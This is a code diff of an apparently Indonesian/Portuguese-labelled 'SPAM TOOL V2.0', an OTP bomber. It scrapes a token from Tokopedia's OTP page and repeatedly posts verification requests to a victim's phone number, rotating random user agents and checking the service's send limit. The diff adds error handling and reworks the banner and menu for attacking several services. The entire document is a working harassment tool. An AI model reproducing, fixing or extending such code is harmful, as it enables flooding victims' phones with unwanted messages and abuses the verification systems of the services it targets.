@@ -20,31 +20,34 @@ class spam:
         return hasil.status_code == 200
 
     def tokped(self):
-        rands = random.choice(open('ua.txt').readlines()).split('\n')[0]
-        kirim = {
-            'User-Agent': rands,
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive',
-            'Origin': 'https://accounts.tokopedia.com',
-            'Accept': 'application/json, text/javascript, */*; q=0.01',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
-        }
-        regist = requests.get(
-            'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=' + self.nomer, headers=kirim).text
-        Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
-        formulir = {
-            "otp_type": "116",
-            "msisdn": self.nomer,
-            "tk": Token,
-            "email": '',
-            "original_param": "",
-            "user_id": "",
-            "signature": "",
-            "number_otp_digit": "6"
-        }
-        req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=kirim, data=formulir).text
-        return 'Anda sudah melakukan 3 kali pengiriman kode' not in req
+        try:
+            rands = random.choice(open('ua.txt').readlines()).split('\n')[0]
+            kirim = {
+                'User-Agent': rands,
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'keep-alive',
+                'Origin': 'https://accounts.tokopedia.com',
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
+            }
+            regist = requests.get(
+                'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=' + self.nomer, headers=kirim).text
+            Token = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
+            formulir = {
+                "otp_type": "116",
+                "msisdn": self.nomer,
+                "tk": Token,
+                "email": '',
+                "original_param": "",
+                "user_id": "",
+                "signature": "",
+                "number_otp_digit": "6"
+            }
+            req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=kirim, data=formulir).text
+            return 'Anda sudah melakukan 3 kali pengiriman kode' not in req
+        except:
+            return False
 
     def phd(self):
         param = {'phone_number': self.nomer}
@@ -125,20 +128,22 @@ def single():
 # ---------------------------Função Banner-----------------------
 def logo():
     os.system('clear')
-    return f"""
+    print(f"""
 {h}╔════════════════════════════════════════╗
 {h}║{b}        SPAM TOOL V2.0 - TERMINAL       {h}║
 {h}╠════════════════════════════════════════╣
 {h}║{k}      Criador: DOCTOR CORINGA LUNÁTICO {h}║
 {h}╚════════════════════════════════════════╝
-"""
+""")
 
 # -------------------------Menu Principal-----------------------
 def jnspam():
     global jns, z
     z = spam("000")  # inicializa classe spam
-    print(logo())
-    print(b+'╔═══════════════\n'+b+'║'+h+'〘 SPAM MENU 〙\n'+b+'╠═══════════════'+b)
+    logo()
+    print(b+'╔═══════════════')
+    print(b+'║'+h+'〘 SPAM MENU 〙')
+    print(b+'╠═══════════════'+b)
     print(b+'║'+m+'1'+h+') ALL')
     print(b+'║'+m+'2'+h+') PHD')
     print(b+'║'+m+'3'+h+') KITABISA')
